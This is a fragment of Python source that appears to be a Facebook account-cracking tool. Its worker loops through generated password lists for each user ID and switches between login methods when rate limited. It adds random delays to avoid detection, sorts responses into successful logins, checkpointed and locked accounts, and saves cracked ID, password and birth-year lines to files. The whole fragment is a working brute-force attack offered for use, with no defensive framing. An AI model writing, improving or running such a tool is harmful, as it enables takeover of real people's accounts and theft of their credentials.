METHODS = [login_v1, login_v2, login_v3]

# ── result processor ──────────────────────────────────────────────────────────
def classify(resp):
    s = str(resp).lower()
    if 'session_key' in resp or 'access_token' in s:
        return 'HIT'
    if 'checkpoint' in s or 'www.facebook.com' in s:
        return 'CP'
    if 'locked' in s or 'disabled' in s or 'suspended' in s:
        return 'LOCKED'
    if 'rate_limited' in s:
        return 'RATELIMIT'
    return 'MISS'

def process(uid, pwd, resp):
    global found_accounts
    status = classify(resp)
    year   = guess_year(uid)

    if status == 'HIT':
        with scan_lock:
            found_accounts += 1
        line = f"{uid}|{pwd}|{year}\n"
        print(f"\n{GREEN}[HIT] {uid} | {pwd} | {year}{RESET}")
        with open(OUTPUT_HIT, 'a') as f:
            f.write(line)
        return True

    if status == 'CP':
        line = f"{uid}|{pwd}|{year}\n"
        print(f"\n{YELLOW}[CP]  {uid} | {pwd} | {year}{RESET}")
        with open(OUTPUT_CP, 'a') as f:
            f.write(line)
        return False

    if status == 'LOCKED':
        with open(OUTPUT_LOCK, 'a') as f:
            f.write(f"{uid}|{year}\n")
        return False

    return False

# ── worker ────────────────────────────────────────────────────────────────────
def worker(uid, method_idx=0):
    global total_scanned
    if stop_event.is_set():
        return False

    token    = get_token()
    fn       = METHODS[method_idx % len(METHODS)]
    fallback = METHODS[(method_idx + 1) % len(METHODS)]
    passwords = build_password_list(uid)

    for pwd in passwords:
        if stop_event.is_set():
            break
        resp = fn(uid, pwd, token)
        if classify(resp) == 'RATELIMIT':
            resp = fallback(uid, pwd, get_token())
        if process(uid, pwd, resp):
            with scan_lock:
                total_scanned += 1
            return True
        jitter()

    with scan_lock:
        total_scanned += 1

    sys.stdout.write(
        f"\r{WHITE}[*] Scan: {CYAN}{total_scanned}{WHITE} | "
        f"Hit: {GREEN}{found_accounts}{WHITE} | "
        f"RateLimit: {RED}{rate_limited}{RESET}   "
    )
    sys.stdout.flush()
    return False

